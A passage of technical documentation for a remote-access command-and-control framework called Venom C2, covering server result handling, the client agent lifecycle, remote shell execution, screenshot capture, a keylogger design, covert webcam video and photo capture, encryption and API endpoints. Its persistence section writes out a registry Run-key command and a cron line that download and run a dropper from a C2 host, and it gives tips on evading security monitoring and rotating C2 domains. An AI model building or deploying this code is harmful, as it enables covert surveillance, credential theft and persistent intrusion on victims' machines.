**Purpose**: Receive, decrypt, and log command execution results.

**What happens inside**:

```python
def receive_result():
    # 1. Get client ID from query parameter
    client_id = request.args.get('clientID')
    
    # 2. Get encrypted result from request body
    encrypted_data = request.data  # Raw bytes
    
    # 3. Decode from Base64 and parse JSON
    encrypted_json = base64.b64decode(encrypted_data).decode()
    encrypted_dict = json.loads(encrypted_json)
    
    # 4. Decrypt with client's AES key
    aes_key = get_aes_key_by_client_id(client_id)
    decrypted_bytes = decrypt_data(
        aes_key,
        encrypted_dict["nonce"],
        encrypted_dict["ciphertext"],
        encrypted_dict["tag"]
    )
    
    # 5. Parse result JSON
    result_dict = ast.literal_eval(decrypted_bytes.decode())
    # result_dict = {"command": "whoami", "result": "john_doe", "client_id": "..."}
    
    # 6. Log to database
    command_log = CommandsLog(
        client_id=result_dict["client_id"],
        command_initiator=command_initiator,  # Set by the command issuer
        commands_history=json.dumps({
            "timestamp": datetime.datetime.now().isoformat(),
            "command": result_dict["command"],
            "result": result_dict["result"]
        })
    )
    db.session.add(command_log)
    db.session.commit()
    
    # 7. Broadcast to all admin dashboards via Socket.IO
    socketio.emit('command_result', {
        "client_id": result_dict["client_id"],
        "result": result_dict["result"],
        "command": result_dict["command"]
    })
    
    return jsonify({"status": "Result received"}), 200
```

## 4.2 Socket.IO Real-time Updates

### How Socket.IO Works

Socket.IO is not pure WebSocket; it's a layer on top that provides:
- **Automatic reconnection**: If the connection drops, the client automatically tries to reconnect
- **Heartbeats**: Server and client ping each other to detect disconnections
- **Fallback**: If WebSocket is unavailable, falls back to HTTP long-polling
- **Rooms**: Ability to send messages to specific groups of clients

### Background Thread Implementation

```python
def background_thread():
    """Runs continuously, sending client list updates every 3 seconds."""
    while True:
        with app.app_context():  # Required for database access in thread
            # Get all clients from database
            all_clients = ClientData.query.all()
            
            # Format for frontend
            client_list = [{
                "client_id": c.client_id,
                "user": c.user,
                "nickname": c.nickname,
                "os": c.os,
                "ip": c.ip,
                "last_active": str(c.last_active),
                "registered_at": str(c.registered_at),
                "address": c.address
            } for c in all_clients]
            
            # Emit to all connected dashboards
            socketio.emit('all_client_list', {
                "type": "full_update",
                "clients": client_list
            })
            
            # Wait 3 seconds before next update
            socketio.sleep(3)
```

**Why is `with app.app_context()` needed?** 
Flask applications have an application context that contains things like database connections. When code runs in a background thread (outside a request), the context isn't automatically available. The `app.app_context()` creates one.

---

# 5. Client-Side Implementation

## 5.1 Client Agent Lifecycle

The client agent goes through several distinct phases from first execution to steady-state operation:

```
┌─────────────────────────────────────────────────────────────────────────────────────┐
│                           CLIENT AGENT LIFECYCLE                                     │
├─────────────────────────────────────────────────────────────────────────────────────┤
│                                                                                     │
│  ┌─────────────────────────────────────────────────────────────────────────────┐   │
│  │ PHASE 1: INITIALIZATION                                                     │   │
│  ├─────────────────────────────────────────────────────────────────────────────┤   │
│  │                                                                             │   │
│  │ 1.1 Check for config file (/tmp/.rootconfig.ini or ~/rootconfig.ini)       │   │
│  │                                                                             │   │
│  │     ┌─────────────────────────────────────────────────────────────────┐    │   │
│  │     │ CONFIG FILE EXISTS?                                              │    │   │
│  │     │   ├── YES → Load client_id and public_key, skip to Phase 2       │    │   │
│  │     │   └── NO  → Proceed to Phase 1.2                                 │    │   │
│  │     └─────────────────────────────────────────────────────────────────┘    │   │
│  │                                                                             │   │
│  │ 1.2 Gather system information:                                              │   │
│  │     - Username: subprocess.check_output("whoami")                          │   │
│  │     - Public IP: requests.get("https://api.ipify.org")                     │   │
│  │     - OS: platform.system()                                                │   │
│  │                                                                             │   │
│  │ 1.3 Register with server (POST /api/clientRegistration)                    │   │
│  │     - Receives client_id and server's RSA public key                        │   │
│  │     - Saves to config file                                                  │   │
│  │                                                                             │   │
│  └─────────────────────────────────────────────────────────────────────────────┘   │
│                                      │                                             │
│                                      ▼                                             │
│  ┌─────────────────────────────────────────────────────────────────────────────┐   │
│  │ PHASE 2: KEY EXCHANGE                                                       │   │
│  ├─────────────────────────────────────────────────────────────────────────────┤   │
│  │                                                                             │   │
│  │ 2.1 Generate random 256-bit AES key (32 bytes)                              │   │
│  │                                                                             │   │
│  │ 2.2 Create payload: {"client_id": "...", "aes_key": "hex..."}              │   │
│  │                                                                             │   │
│  │ 2.3 Encrypt payload with server's RSA public key (PKCS1_OAEP)              │   │
│  │                                                                             │   │
│  │ 2.4 Send to server (POST /api/aes-share)                                    │   │
│  │                                                                             │   │
│  │ 2.5 Store AES key in memory (not written to disk)                           │   │
│  │                                                                             │   │
│  └─────────────────────────────────────────────────────────────────────────────┘   │
│                                      │                                             │
│                                      ▼                                             │
│  ┌─────────────────────────────────────────────────────────────────────────────┐   │
│  │ PHASE 3: PERSISTENCE SETUP                                                  │   │
│  ├─────────────────────────────────────────────────────────────────────────────┤   │
│  │                                                                             │   │
│  │ 3.1 Check if persistence already configured                                 │   │
│  │                                                                             │   │
│  │ 3.2 If not, add persistence mechanism:                                      │   │
│  │     - Windows: Add registry key to HKCU\Software\Microsoft\Windows\...\Run │   │
│  │     - Linux: Add cron job to crontab                                        │   │
│  │                                                                             │   │
│  │ 3.3 Persistence entry points to dropper (not the agent itself)             │   │
│  │                                                                             │   │
│  └─────────────────────────────────────────────────────────────────────────────┘   │
│                                      │                                             │
│                                      ▼                                             │
│  ┌─────────────────────────────────────────────────────────────────────────────┐   │
│  │ PHASE 4: MAIN LOOP (STEADY STATE)                                           │   │
│  ├─────────────────────────────────────────────────────────────────────────────┤   │
│  │                                                                             │   │
│  │  while True:                                                                │   │
│  │     4.1 Poll for commands (GET /command-transmission-to-client)            │   │
│  │     4.2 Decrypt response with AES key                                       │   │
│  │     4.3 If command received:                                                │   │
│  │         4.3.1 Parse command (check for special commands)                   │   │
│  │         4.3.2 Execute command (shell or special handler)                   │   │
│  │         4.3.3 Encrypt result with AES key                                  │   │
│  │         4.3.4 Send result (POST /execution-result-of-command-from-client)  │   │
│  │     4.4 Sleep for 5 seconds                                                 │   │
│  │                                                                             │   │
│  └─────────────────────────────────────────────────────────────────────────────┘   │
│                                                                                     │
└─────────────────────────────────────────────────────────────────────────────────────┘
```

## 5.2 Command Execution Engine

The client's command execution engine handles several categories of commands differently:

### Category 1: Shell Commands

Any command that doesn't match a special keyword is executed in the system shell.

**How it works:**
```python
def execute_shell_command(command):
    # subprocess.run captures both stdout and stderr
    result = subprocess.run(
        command,
        shell=True,           # Use system shell (cmd.exe or /bin/sh)
        cwd=current_directory, # Execute in the current working directory
        capture_output=True,   # Capture stdout and stderr
        text=True              # Return strings instead of bytes
    )
    
    # Return stdout if successful, otherwise stderr
    if result.returncode == 0:
        return result.stdout
    else:
        return result.stderr
```

**Why use `shell=True`?** 
This allows features like pipes (`|`), redirection (`>`), and environment variables (`%VAR%` or `$VAR`). However, it requires careful input sanitization to prevent command injection.

### Category 2: Directory Navigation (`cd`)

The `cd` command is handled specially because it needs to change the client's current working directory.

**How it works:**
```python
if command.startswith("cd "):
    new_path = command[3:].strip()  # Remove "cd " prefix
    
    # Handle absolute vs relative paths
    if os.path.isabs(new_path):
        current_directory = new_path
    else:
        current_directory = os.path.join(current_directory, new_path)
    
    # Normalize the path (e.g., C:/Users/../Windows → C:/Windows)
    current_directory = os.path.normpath(current_directory)
    
    return f"Changed directory to {current_directory}"
```

**Why special handling?** 
`cd` is a shell built-in, not a separate executable. Running `cd` via `subprocess.run()` would change the directory of the subprocess (which exits immediately), not the parent Python process.

### Category 3: Screenshot Capture

```python
if command == "screenshot":
    with mss.mss() as sct:
        # Grab the primary monitor (index 1)
        screenshot = sct.grab(sct.monitors[1])
        
        # Convert raw RGB to PNG format
        screenshot_bytes = mss.tools.to_png(screenshot.rgb, screenshot.size)
        
        # Encrypt before sending
        encrypted = encrypt_data(aes_key, screenshot_bytes)
        
        # Send to server
        files = {"file": ("screenshot.enc", json.dumps(encrypted).encode())}
        data = {"client_id": client_id}
        requests.post(f"{SERVER_URL}/api/screenshot", files=files, data=data)
```

### Category 4: Keylogging

The keylogger runs in separate threads so it doesn't block the main command loop.

**Keylogger architecture:**
```
┌─────────────────────────────────────────────────────────────────┐
│                    KEYLOGGER ARCHITECTURE                       │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  ┌─────────────┐                                               │
│  │  Keyboard   │                                               │
│  │   Events    │                                               │
│  └──────┬──────┘                                               │
│         │                                                       │
│         ▼                                                       │
│  ┌─────────────────────────────────────────────────────────┐   │
│  │              Keylogger Thread                            │   │
│  │                                                          │   │
│  │  while running:                                          │   │
│  │      event = wait_for_keypress()                         │   │
│  │      char = convert_keycode_to_char(event)               │   │
│  │      with buffer_lock:                                   │   │
│  │          keylog_buffer.append(char)                      │   │
│  └─────────────────────────────────────────────────────────┘   │
│                              │                                   │
│                              │ (buffer grows)                    │
│                              ▼                                   │
│  ┌─────────────────────────────────────────────────────────┐   │
│  │              Sender Thread                               │   │
│  │                                                          │   │
│  │  while running:                                          │   │
│  │      sleep(10)                                           │   │
│  │      with buffer_lock:                                   │   │
│  │          if buffer not empty:                            │   │
│  │              data = ''.join(buffer)                      │   │
│  │              buffer.clear()                              │   │
│  │      encrypted = encrypt(aes_key, data)                  │   │
│  │      send_to_server(encrypted)                           │   │
│  └─────────────────────────────────────────────────────────┘   │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

**Why two threads?** 
- Keylogger thread must respond immediately to keyboard events
- Sending to server involves network I/O (slow)
- Separating them prevents dropped keystrokes

### Category 5: Video Recording

Video recording uses native libraries for performance. The Python client dynamically loads the appropriate library for the OS.

**Windows:**
```python
# Load video_windows.dll
video_lib = ctypes.CDLL("video_windows.dll")

# Define function signature
video_lib.captureVideo.argtypes = [ctypes.c_char_p, ctypes.c_int, ctypes.c_int]
video_lib.captureVideo.restype = ctypes.c_int

# Call the native function
filename = "temp_video.avi"
result = video_lib.captureVideo(filename.encode(), duration, fps)
```

**Linux:**
```python
# Load video.so
video_lib = ctypes.CDLL("video.so")

# Define callback type (C function pointer)
FRAME_CALLBACK = ctypes.CFUNCTYPE(None, ctypes.POINTER(ctypes.c_ubyte), ctypes.c_size_t)
callback = FRAME_CALLBACK(send_frame)

# Call native function
video_lib.start_video_capture(duration, fps, callback)
```

## 5.3 Persistence Mechanism Explained

### Why Persistence Matters

Without persistence, if the target computer reboots, the agent stops running. The operator would need to re-infect the machine. Persistence ensures the agent automatically restarts after reboot.

### Windows Persistence: Registry Run Keys

**The Registry key:** `HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run`

This key contains programs that run when the current user logs in. Each entry has a name (value name) and the command to execute (value data).

**What gets added:**
```
Name: DropperPowerShell
Value: cmd.exe /c "if exist %TEMP%\dropper.exe (start /b %TEMP%\dropper.exe) else (curl -k https://venom.c2:5000/dropper.exe -o %TEMP%\dropper.exe && start /b %TEMP%\dropper.exe)"
```

**Breaking down the command:**
```
cmd.exe /c                                    # Run cmd.exe, then exit
"if exist %TEMP%\dropper.exe (                # If dropper.exe exists...
    start /b %TEMP%\dropper.exe               # Run it without a window
) else (                                      # Otherwise...
    curl -k https://venom.c2:5000/dropper.exe # Download dropper
    -o %TEMP%\dropper.exe                     # Save to TEMP folder
    && start /b %TEMP%\dropper.exe            # Then run it
)"
```

**Why use the dropper pattern?** 
- If the agent is updated, you only replace the agent file; the dropper stays the same
- The registry entry doesn't need to change when the agent updates
- Smaller persistence footprint (dropper is tiny)

### Linux Persistence: Cron Jobs

**Crontab entry added:**
```
0 * * * * [ -f /tmp/dropper ] || (wget --no-check-certificate -q https://venom.c2:5000/dropper -O /tmp/dropper && chmod +x /tmp/dropper); [ -f /tmp/dropper ] && [ -x /tmp/dropper ] && /tmp/dropper # DropperCron
```

**Breaking down the command:**
```
0 * * * *                                     # Run at minute 0 of every hour
[ -f /tmp/dropper ] || (                     # If dropper does NOT exist...
    wget --no-check-certificate -q ...        # Download it
    && chmod +x /tmp/dropper                  # Make executable
)
[ -f /tmp/dropper ] && [ -x /tmp/dropper ] && /tmp/dropper  # If exists and executable, run it
```

**Why cron instead of init.d/systemd?** 
- Cron works on almost all Linux distributions
- No root privileges needed (user crontab)
- Less likely to be monitored by security software

---

# 6. Native Code Components

## 6.1 Windows Video Capture (DirectShow)

### Understanding DirectShow

DirectShow is Microsoft's multimedia framework. It works as a **graph** of **filters** connected by **pins**:

```
┌─────────────┐    ┌─────────────┐    ┌─────────────┐    ┌─────────────┐
│  Capture    │    │   AVI Mux   │    │ File Writer │    │   File on   │
│   Source    │───▶│  Filter     │───▶│   Filter    │───▶│    Disk     │
│   Filter    │    │             │    │             │    │             │
└─────────────┘    └─────────────┘    └─────────────┘    └─────────────┘
```

- **Capture Source Filter**: Represents the webcam hardware
- **AVI Mux Filter**: Packages video frames into AVI container format
- **File Writer Filter**: Writes the AVI data to a file

### Building the Graph Step by Step

```c
// Step 1: Create an empty filter graph
IGraphBuilder* pGraph = NULL;
CoCreateInstance(&CLSID_FilterGraph, NULL, CLSCTX_INPROC_SERVER, 
                 &IID_IGraphBuilder, (void**)&pGraph);

// Step 2: Create a capture graph builder (helper for connecting)
ICaptureGraphBuilder2* pBuilder = NULL;
CoCreateInstance(&CLSID_CaptureGraphBuilder2, NULL, CLSCTX_INPROC_SERVER,
                 &IID_ICaptureGraphBuilder2, (void**)&pBuilder);

// Step 3: Enumerate video capture devices
ICreateDevEnum* pDevEnum = NULL;
CoCreateInstance(&CLSID_SystemDeviceEnum, NULL, CLSCTX_INPROC_SERVER,
                 &IID_ICreateDevEnum, (void**)&pDevEnum);

// Get the list of video input devices
pDevEnum->lpVtbl->CreateClassEnumerator(pDevEnum, 
    &CLSID_VideoInputDeviceCategory, &pEnum, 0);

// Get the first device (index 0)
pEnum->lpVtbl->Next(pEnum, 1, &pMoniker, NULL);

// Bind the device to a filter
pMoniker->lpVtbl->BindToObject(pMoniker, NULL, NULL, 
    &IID_IBaseFilter, (void**)&pCap);

// Step 4: Add the capture filter to the graph
pGraph->lpVtbl->AddFilter(pGraph, pCap, L"Capture Filter");

// Step 5: Find the capture pin and configure frame rate
pBuilder->lpVtbl->FindPin(pBuilder, (IUnknown*)pCap, PINDIR_OUTPUT,
    &PIN_CATEGORY_CAPTURE, &MEDIATYPE_Video, FALSE, 0, (void**)&pCapturePin);

// Get current format
pCapturePin->lpVtbl->QueryInterface(pCapturePin, &IID_IAMStreamConfig, 
    (void**)&pConfig);
pConfig->lpVtbl->GetFormat(pConfig, &pmt);

// Modify frame rate (AvgTimePerFrame is in 100-ns units)
VIDEOINFOHEADER* vih = (VIDEOINFOHEADER*)pmt->pbFormat;
vih->AvgTimePerFrame = 10000000 / fps;  // e.g., 30 fps = 333,333

// Apply the new format
pConfig->lpVtbl->SetFormat(pConfig, pmt);

// Step 6: Create AVI Mux and File Writer filters
CoCreateInstance(&CLSID_AviDest, NULL, CLSCTX_INPROC_SERVER,
                 &IID_IBaseFilter, (void**)&pAviMux);
CoCreateInstance(&CLSID_FileWriter, NULL, CLSCTX_INPROC_SERVER,
                 &IID_IBaseFilter, (void**)&pFileWriter);

// Set output file name
pFileWriter->lpVtbl->QueryInterface(pFileWriter, &IID_IFileSinkFilter, 
    (void**)&pSink);
pSink->lpVtbl->SetFileName(pSink, L"output.avi", NULL);

// Step 7: Connect everything
pBuilder->lpVtbl->RenderStream(pBuilder, &PIN_CATEGORY_CAPTURE, 
    &MEDIATYPE_Video, pCap, pAviMux, pFileWriter);

// Step 8: Start recording
pControl->lpVtbl->Run(pControl);
Sleep(durationSeconds * 1000);
pControl->lpVtbl->Stop(pControl);
```

### Frame Rate Calculation

DirectShow measures time in 100-nanosecond units (also called "reference time units"):

- 1 second = 10,000,000 (100-ns units)
- For 30 frames per second: 10,000,000 / 30 = 333,333 units per frame
- This means each frame should be displayed for 33.3 milliseconds

## 6.2 Windows Photo Capture (Sample Grabber)

For photo capture, we need a single frame, not a video file. DirectShow provides the **Sample Grabber** filter for this.

```
┌─────────────┐    ┌─────────────────┐    ┌─────────────┐
│  Capture    │    │  Sample Grabber │    │    Null     │
│   Source    │───▶│    Filter       │───▶│  Renderer   │
│   Filter    │    │                 │    │             │
└─────────────┘    └─────────────────┘    └─────────────┘
                         │
                         │ (captured frame)
                         ▼
                    ┌─────────┐
                    │ Buffer  │
                    │ in RAM  │
                    └─────────┘
```

**Why Null Renderer?** 
Every DirectShow graph needs a final renderer (something that consumes the data). The Null Renderer discards the data after the Sample Grabber captures it, which is perfect for our use case.

### Sample Grabber Configuration

```c
// Create Sample Grabber filter
CoCreateInstance(&CLSID_SampleGrabber, NULL, CLSCTX_INPROC_SERVER,
                 &IID_IBaseFilter, (void**)&pSampleGrabberFilter);

// Get the ISampleGrabber interface
pSampleGrabberFilter->lpVtbl->QueryInterface(pSampleGrabberFilter, 
    &IID_ISampleGrabber, (void**)&pSampleGrabber);

// Set media type to RGB24 (uncompressed, easy to work with)
AM_MEDIA_TYPE mt;
mt.majortype = MEDIATYPE_Video;
mt.subtype = MEDIASUBTYPE_RGB24;
pSampleGrabber->lpVtbl->SetMediaType(pSampleGrabber, &mt);

// Configure: one-shot mode + buffer samples
pSampleGrabber->lpVtbl->SetOneShot(pSampleGrabber, TRUE);    // Capture only 1 frame
pSampleGrabber->lpVtbl->SetBufferSamples(pSampleGrabber, TRUE); // Keep in buffer

// Run the graph briefly
pControl->lpVtbl->Run(pControl);
Sleep(1000);  // Give camera time to produce a frame

// Retrieve the captured frame
long bufferSize = 0;
pSampleGrabber->lpVtbl->GetCurrentBuffer(pSampleGrabber, &bufferSize, NULL);
BYTE* buffer = (BYTE*)malloc(bufferSize);
pSampleGrabber->lpVtbl->GetCurrentBuffer(pSampleGrabber, &bufferSize, (long*)buffer);

// The buffer contains raw RGB24 data (3 bytes per pixel)
// Write as BMP file (adds BMP header)
```

### BMP File Format

The BMP file format is simple: a 54-byte header followed by raw pixel data.

```
Offset  Size    Field           Description
0       2       bfType          Must be "BM" (0x4D42)
2       4       bfSize          Total file size in bytes
10      4       bfOffBits       Offset to pixel data (54 bytes for uncompressed)

14      4       biSize          Header size (40 bytes)
18      4       biWidth         Image width in pixels
22      4       biHeight        Image height (positive = bottom-up)
26      2       biPlanes        Must be 1
28      2       biBitCount      Bits per pixel (24 for RGB)
34      4       biSizeImage     Size of pixel data in bytes
```

## 6.3 Linux Video Capture (V4L2)

### Understanding V4L2

Video4Linux2 is the Linux kernel's API for video capture devices. It uses the **device file** `/dev/video0` (or `/dev/video1`, etc.).

### V4L2 Operation Flow

```
┌─────────────────────────────────────────────────────────────────┐
│                      V4L2 CAPTURE FLOW                          │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  1. open("/dev/video0", O_RDWR)                                │
│     └── Obtain file descriptor                                  │
│                                                                 │
│  2. ioctl(fd, VIDIOC_QUERYCAP, &cap)                           │
│     └── Check device capabilities (must support capture)       │
│                                                                 │
│  3. ioctl(fd, VIDIOC_S_FMT, &fmt)                              │
│     └── Set format (width, height, pixel format)               │
│         Example: 640x480, MJPEG                                │
│                                                                 │
│  4. ioctl(fd, VIDIOC_REQBUFS, &req)                            │
│     └── Request buffers from driver (usually 2-4 buffers)      │
│                                                                 │
│  5. For each buffer:                                            │
│     ioctl(fd, VIDIOC_QUERYBUF, &buf)                           │
│     mmap(NULL, buf.length, PROT_READ|PROT_WRITE, MAP_SHARED,   │
│           fd, buf.m.offset)                                    │
│     └── Map buffer to userspace memory                         │
│                                                                 │
│  6. ioctl(fd, VIDIOC_STREAMON, &type)                          │
│     └── Start video capture                                     │
│                                                                 │
│  7. For each frame:                                             │
│     ioctl(fd, VIDIOC_QBUF, &buf)  // Queue empty buffer        │
│     ioctl(fd, VIDIOC_DQBUF, &buf) // Dequeue filled buffer     │
│     // buf.bytesused contains frame size                       │
│     // buf.start points to frame data                          │
│     process_frame()                                             │
│                                                                 │
│  8. ioctl(fd, VIDIOC_STREAMOFF, &type)                         │
│     └── Stop capture                                            │
│                                                                 │
│  9. For each buffer: munmap()                                  │
│                                                                 │
│  10. close(fd)                                                  │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

### Memory-Mapped I/O (MMAP)

V4L2 uses memory mapping to avoid copying data between kernel and userspace:

```
┌──────────────┐         ┌──────────────┐
│   Kernel     │         │  Userspace   │
│   Space      │         │   (Python/   │
│              │         │    C code)   │
└──────┬───────┘         └──────┬───────┘
       │                        │
       │  Camera hardware       │
       │  writes directly       │
       │  into kernel buffer    │
       │                        │
       ▼                        │
┌──────────────┐                │
│ Kernel Buffer│◄───────────────┤
│  (physical   │   mmap() maps  │
│   memory)    │   same physical│
└──────────────┘   pages here   │
       ▲                        │
       │                        │
       │  No copying!           │
       │  Userspace reads       │
       │  directly from         │
       │  mapped memory         │
       │                        │
       └────────────────────────┘
```

**Benefits of MMAP:**
- Zero-copy: No buffer between kernel and userspace
- Faster: Especially important for high-resolution video
- Less CPU usage: No memcpy() calls

### Pixel Formats

V4L2 supports many pixel formats. Venom C2 uses MJPEG:

| Format | FourCC Code | Description | Pros | Cons |
|--------|-------------|-------------|------|------|
| MJPEG | `V4L2_PIX_FMT_MJPEG` | Motion JPEG | Smaller size, works over network | Lossy compression |
| YUYV | `V4L2_PIX_FMT_YUYV` | YUV 4:2:2 | Uncompressed, high quality | Large size |
| RGB24 | `V4L2_PIX_FMT_RGB24` | 24-bit RGB | Easy to process | Very large size |

## 6.4 Linux Photo Capture (Single Frame)

Photo capture is similar to video capture, but only one frame:

```c
// Same setup as video capture
open("/dev/video0", O_RDWR);
ioctl(fd, VIDIOC_S_FMT, &fmt);  // Set format
ioctl(fd, VIDIOC_REQBUFS, &req); // Request buffers
mmap(...);                       // Map buffers
ioctl(fd, VIDIOC_STREAMON, &type);

// Capture one frame
ioctl(fd, VIDIOC_QBUF, &buf);
ioctl(fd, VIDIOC_DQBUF, &buf);

// buf.start contains the MJPEG frame
// This is already JPEG format - can be sent directly!

// Cleanup
ioctl(fd, VIDIOC_STREAMOFF, &type);
munmap(...);
close(fd);
```

**Note:** Unlike Windows, Linux webcams often output MJPEG directly. This means no conversion is needed - the captured bytes are already a valid JPEG image that can be saved or sent.

---

# 7. Security Architecture

## 7.1 Encryption Overview

Venom C2 uses a **hybrid cryptosystem**: RSA for key exchange, AES for data encryption.

```
┌─────────────────────────────────────────────────────────────────────────────────────┐
│                           HYBRID ENCRYPTION ARCHITECTURE                             │
├─────────────────────────────────────────────────────────────────────────────────────┤
│                                                                                     │
│  ┌─────────────────────────────────────────────────────────────────────────────┐   │
│  │                         PHASE 1: KEY EXCHANGE                                 │   │
│  │                         (RSA-2048, OAEP padding)                             │   │
│  ├─────────────────────────────────────────────────────────────────────────────┤   │
│  │                                                                             │   │
│  │   Client                                    Server                          │   │
│  │   ┌─────────────────┐                       ┌─────────────────┐             │   │
│  │   │ Generate AES    │                       │ Have RSA        │             │   │
│  │   │ key (32 bytes)  │                       │ private key     │             │   │
│  │   └────────┬────────┘                       └────────┬────────┘             │   │
│  │            │                                          │                      │   │
│  │            ▼                                          │                      │   │
│  │   ┌─────────────────┐                               │                      │   │
│  │   │ Encrypt with    │                               │                      │   │
│  │   │ RSA public key  │                               │                      │   │
│  │   └────────┬────────┘                               │                      │   │
│  │            │                                         │                      │   │
│  │            ▼                                         │                      │   │
│  │   ┌─────────────────┐       POST /api/aes-share     │                      │   │
│  │   │ Encrypted       │ ─────────────────────────────▶ │                      │   │
│  │   │ AES key         │                               │                      │   │
│  │   └─────────────────┘                               │                      │   │
│  │                                                      ▼                      │   │
│  │                                            ┌─────────────────┐             │   │
│  │                                            │ Decrypt with    │             │   │
│  │                                            │ RSA private key │             │   │
│  │                                            └────────┬────────┘             │   │
│  │                                                     │                      │   │
│  │                                                     ▼                      │   │
│  │                                            ┌─────────────────┐             │   │
│  │                                            │ Store AES key   │             │   │
│  │                                            │ in database     │             │   │
│  │                                            └─────────────────┘             │   │
│  └─────────────────────────────────────────────────────────────────────────────┘   │
│                                                                                     │
│  ┌─────────────────────────────────────────────────────────────────────────────┐   │
│  │                      PHASE 2: DATA ENCRYPTION                                │   │
│  │                      (AES-256-GCM, 12-byte nonce)                            │   │
│  ├─────────────────────────────────────────────────────────────────────────────┤   │
│  │                                                                             │   │
│  │   Plaintext: "whoami"                                                       │   │
│  │       │                                                                      │   │
│  │       ▼                                                                      │   │
│  │   ┌─────────────────────────────────────────────────────────────────────┐   │   │
│  │   │  AES-256-GCM                                                         │   │   │
│  │   │                                                                      │   │   │
│  │   │  Input:                                                              │   │   │
│  │   │    - Plaintext (variable length)                                     │   │   │
│  │   │    - AES key (32 bytes)                                              │   │   │
│  │   │    - Nonce (12 bytes, random)                                        │   │   │
│  │   │                                                                      │   │   │
│  │   │  Output:                                                             │   │   │
│  │   │    - Ciphertext (same length as plaintext)                           │   │   │
│  │   │    - Authentication Tag (16 bytes)                                   │   │   │
│  │   └─────────────────────────────────────────────────────────────────────┘   │   │
│  │       │                                                                      │   │
│  │       ▼                                                                      │   │
│  │   Transmitted: {                                                             │   │
│  │       "nonce": "a1b2c3d4e5f6789012345678",                                   │   │
│  │       "ciphertext": "f9e8d7c6b5a43210...",                                   │   │
│  │       "tag": "1234567890abcdef1234567890abcdef"                              │   │
│  │   }                                                                          │   │
│  │                                                                             │   │
│  └─────────────────────────────────────────────────────────────────────────────┘   │
│                                                                                     │
└─────────────────────────────────────────────────────────────────────────────────────┘
```

## 7.2 Why AES-GCM?

AES-GCM (Galois/Counter Mode) provides both confidentiality and authenticity:

| Feature | Without GCM | With GCM |
|---------|-------------|----------|
| **Confidentiality** (can't read data) | ✓ (AES-CBC, etc.) | ✓ |
| **Integrity** (can't modify data) | ✗ (needs separate HMAC) | ✓ (built-in) |
| **Authenticity** (can't forge data) | ✗ (needs separate HMAC) | ✓ (built-in) |

**The authentication tag** is a 16-byte value that ensures the ciphertext hasn't been tampered with. If someone modifies the encrypted data, decryption will fail (it won't produce garbage; it will raise an exception).

## 7.3 JWT Authentication Flow

```
┌─────────────────────────────────────────────────────────────────────────────────────┐
│                           JWT AUTHENTICATION FLOW                                    │
├─────────────────────────────────────────────────────────────────────────────────────┤
│                                                                                     │
│  ┌─────────────┐                                                                   │
│  │   Admin     │                                                                   │
│  │  Browser    │                                                                   │
│  └──────┬──────┘                                                                   │
│         │                                                                           │
│         │ 1. POST /api/login-verify                                                │
│         │    {codename: "admin", secret: "secret"}                                 │
│         │                                                                           │
│         ▼                                                                           │
│  ┌─────────────────────────────────────────────────────────────────────────────┐   │
│  │                              C2 SERVER                                       │   │
│  │                                                                             │   │
│  │  2. Validate credentials against Admin table                                │   │
│  │     bcrypt.checkpw(password_hash, stored_hash)                              │   │
│  │                                                                             │   │
│  │  3. Generate JWT token:                                                      │   │
│  │     Header: {"alg": "HS256", "typ": "JWT"}                                  │   │
│  │     Payload: {                                                              │   │
│  │         "user": {"role": "admin", "codename": "admin"},                     │   │
│  │         "exp": now + 1 hour,                                                │   │
│  │         "iat": now                                                          │   │
│  │     }                                                                        │   │
│  │     Signature: HMAC-SHA256(header + "." + payload, secret_key)              │   │
│  │                                                                             │   │
│  │  4. Return token to browser                                                  │   │
│  │     Set-Cookie: token=<jwt_token>; HttpOnly; Secure; SameSite=Strict        │   │
│  │                                                                             │   │
│  └─────────────────────────────────────────────────────────────────────────────┘   │
│         │                                                                           │
│         │ 5. Subsequent requests include cookie                                    │
│         │    Cookie: token=<jwt_token>                                             │
│         │                                                                           │
│         ▼                                                                           │
│  ┌─────────────────────────────────────────────────────────────────────────────┐   │
│  │  6. Server validates:                                                         │   │
│  │     - Signature matches?                                                     │   │
│  │     - Token not expired?                                                     │   │
│  │     - Token not blacklisted?                                                 │   │
│  │                                                                             │   │
│  │  7. Extract user role and proceed                                            │   │
│  └─────────────────────────────────────────────────────────────────────────────┘   │
│                                                                                     │
└─────────────────────────────────────────────────────────────────────────────────────┘
```

## 7.4 Security Considerations & Best Practices

### What This C2 Does Well

| Aspect | Implementation | Security Level |
|--------|----------------|----------------|
| **Transport Security** | HTTPS with TLS 1.2+ | Strong |
| **Data at Rest** | AES-256 keys stored, bcrypt passwords | Strong |
| **Key Exchange** | RSA-2048 with OAEP | Strong |
| **Data in Transit** | AES-256-GCM with unique nonce per message | Strong |
| **Authentication** | JWT with 1-hour expiry, HTTP-only cookies | Strong |
| **Authorization** | Role-based (admin vs superadmin) | Strong |

### Potential Improvements for Production

1. **Certificate Pinning**: Validate server certificate against a known hash
2. **Perfect Forward Secrecy**: Use ephemeral key exchange (not currently implemented)
3. **Database Encryption**: Encrypt AES keys with a master key
4. **Rate Limiting**: Prevent brute force on API endpoints
5. **C2 Domain Rotation**: Use domain fronting or fast-flux DNS

---

# 8. API Reference

## 8.1 Complete API Endpoint Documentation

### 8.1.1 Client Registration

| Property | Value |
|----------|-------|
| **Endpoint** | `/api/clientRegistration` |
| **Method** | POST |
| **Authentication** | None |
| **Content-Type** | application/json |

**Request Body:**
```json
{
    "user": "john_doe",           // Required - username from whoami
    "public_ip": "203.0.113.45",  // Required - public IP address
    "os": "Windows"                // Required - "Windows" or "Linux"
}
```

**Response (201 Created):**
```json
{
    "client_id": "aB3xY9-20250115143022",
    "reg_date": "2025-01-15 14:30:22",
    "public_key": "-----BEGIN PUBLIC KEY-----\nMIIBIjANBgkqhkiG...\n-----END PUBLIC KEY-----"
}
```

**Error Responses:**
- `400 Bad Request`: Missing required fields
- `500 Internal Server Error`: Database error

### 8.1.2 AES Key Exchange

| Property | Value |
|----------|-------|
| **Endpoint** | `/api/aes-share` |
| **Method** | POST |
| **Authentication** | None |
| **Content-Type** | application/json |

**Request Body:**
```json
{
    "encrypted_payload": "a1b2c3d4e5f67890abcdef1234567890..."  // Hex string
}
```

**Response (200 OK):**
```json
{
    "status": "AES key stored successfully"
}
```

